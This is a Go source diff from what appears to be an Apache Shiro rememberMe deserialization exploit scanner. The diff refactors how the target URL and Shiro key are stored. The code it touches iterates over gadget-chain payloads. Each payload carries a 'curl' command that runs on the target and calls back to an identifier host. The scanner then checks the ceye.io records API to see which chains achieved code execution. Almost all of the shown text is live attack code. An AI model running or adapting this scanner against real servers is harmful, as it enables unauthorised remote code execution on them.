@@ -42,7 +42,8 @@ type queryResult struct {
 var availableGadget = make([]string, 0, 10)
 
 type GadgetScanner struct {
-	Target *ShiroTarget
+	TargetUrl      string
+	TargetShiroKey string
 }
 
 func (this GadgetScanner) Scan() {
@@ -50,16 +51,16 @@ func (this GadgetScanner) Scan() {
 	payloadMap := new(data.PayloadMap)
 	payloadMap.AddAllPayload()
 	//
-	fmt.Fprintln(os.Stderr, "[*]Use Key: "+this.Target.Key)
+	fmt.Fprintln(os.Stderr, "[*]Use Key: "+this.TargetShiroKey)
 	for funcName, serialFunc := range payloadMap.NamedFunc {
 		randomID := uuid.New()[0:12]
 		var command = fmt.Sprintf("curl %s/%s", IDENTIFIER, randomID)
 		// Dynamic invoke the serialFunc
 		serialData := serialFunc(command)
 
-		shiroConnection := conn.NewConnection(this.Target.Base)
+		shiroConnection := conn.NewConnection(this.TargetUrl)
 		fmt.Println("[+] Test Payload: " + funcName)
-		response := shiroConnection.SendRememberMe([]byte(this.Target.Key), serialData)
+		response := shiroConnection.SendRememberMe([]byte(this.TargetShiroKey), serialData)
 		fmt.Println("[-] Response Code: " + strconv.Itoa(response.StatusCode))
 
 		var queryTemplate = "http://api.ceye.io/v1/records?token=%s&type=http&filter=%s"
